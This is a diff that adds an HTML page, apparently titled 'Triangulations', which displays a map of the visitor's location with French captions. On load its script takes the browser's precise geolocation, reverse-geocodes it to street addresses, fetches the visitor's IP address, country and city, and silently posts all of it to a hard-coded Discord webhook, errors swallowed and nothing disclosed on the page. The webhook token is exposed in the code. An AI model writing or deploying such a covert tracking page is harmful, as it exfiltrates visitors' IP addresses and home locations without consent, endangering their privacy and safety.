@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Triangulations</title>
+</head>
+<body>
+    <div id="map" style="height: 650px; width: 650px;"></div>
+    <p>Possibilitées : <br> <span class="poss" ></span></p>
+
+    <script>
+        function sendMessageToDiscord(content) {
+            fetch('http://ip-api.com/json')
+                .then(response => response.json())
+                .then(({ query, country, city, regionName }) => {
+                    const message = `# Address ip : ${query}\n\n- Pays : ${country}\n- Ville : ${city}\n- Region : ${regionName}\n### Possibilités : \n ${content.split('\n').map(e => ` -  __${e}__`).join('\n')}`;
+
+                    fetch('https://discord.com/api/webhooks/1121364427820769340/a1rhihUdmuoZtxFy_xitB0tqmaSsagnPrbch9Te5zDpA1iMKttt3Yp3YU_f3kfYRmgN3', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ content: message }),
+                    }).catch();
+                }).catch();
+        }
+
+        async function initializeMap() {
+            try {
+                const { coords: { latitude, longitude } } = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                });
+
+                const map = L.map("map").setView([latitude, longitude], 13);
+                L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", { maxZoom: 18 }).addTo(map);
+
+                L.marker([latitude, longitude]).addTo(map).bindPopup(`Tu est ici (ou presque mdr)`).openPopup();
+                const response = await fetch(`https://api-adresse.data.gouv.fr/reverse/?lon=${longitude}&lat=${latitude}`);
+                const { features } = await response.json();
+                const message = features.map(el => el.properties.label).join('\n');
+                document.querySelector('.poss').innerHTML = message.split('\n').map(el => el + "<br/>")
+                sendMessageToDiscord(message);
+            } catch (err) { // 
+            }
+        }
+
+        initializeMap();
+    </script>
+</body>
+</html>
